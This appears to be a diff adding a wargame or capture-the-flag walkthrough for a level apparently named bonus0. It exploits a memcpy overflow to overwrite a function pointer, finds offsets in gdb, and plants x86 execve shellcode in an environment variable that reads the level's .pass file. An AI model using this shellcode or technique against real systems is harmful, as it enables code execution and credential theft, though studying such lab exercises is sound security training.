@@ -1,2 +1,48 @@
 memcpy got 0x8049b68 -> 0x8048516
 memcpy overwrite adress 0x804a010
+
+The binary takes two arg. Then make few instructions 
+and at the end call a function pointer.
+
+With this  `python -c 'print "A"*1500'` `python -c 'print "B"*500'`
+in arg we can rewrite the function pointer address. :
+(gdb) info reg $eax
+eax       0x41414141            1818978921
+
+
+The goal is to rewrite this address with a shellcode's address.
+Now we need to know exactly where write our address:
+
+`python -c 'print "A"*100 + "abcdefghijklmnopqrstuvwxyz"'` `python -c 'print "B"*500'`
+
+(gdb) info reg $eax
+eax            0x6c6b6a69       1818978921
+
+6c 6b 6a 69 is the ascii code for i j k l.
+
+`python -c 'print "A"*100 + "abcdefgh"+"SHELLCODEADDRESS"+"mnopqrstuvwxyz"'` `python -c 'print "B"*500'`
+
+First we set a variable in the environment with the shellcode
+
+export SHELLCODE=`python -c 'print "\x90"*100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus0/.pass;exit;"'`
+
+Then we have to set a variable with the address of the shellcode.
+
+export SHELLADD=`python -c 'print "\x38\xf7\xff\xbf" * 50'`
+
+now we need the address of SHELLADD :
+
+x/1024x $ebp 
+0xbffffe48:	0x6f682f3d	0x752f656d	0x2f726573	0x6576656c
+0xbffffe58:	0x5300396c	0x4c564c48	0x4c00333d	0x414e474f
+0xbffffe68:	0x6c3d454d	0x6c657665	0x48530039	0x414c4c45
+0xbffffe78:	0xf83d4444	0xf8bffff7	0xf8bffff7	0xf8bffff7
+0xbffffe88:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
+0xbffffe98:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
+0xbffffea8:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
+0xbffffeb8:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
+0xbffffec8:	0xf8bffff7	0xf8bffff7	0xf8bffff7	0xf8bffff7
+
+the address is 0xbffffe88
+
+`python -c 'print "A"*100 + "abcdefgh"+"\x89\xfe\xff\xbf"+"mnopqrstuvwxyz"'` `python -c 'print "B"*500'`
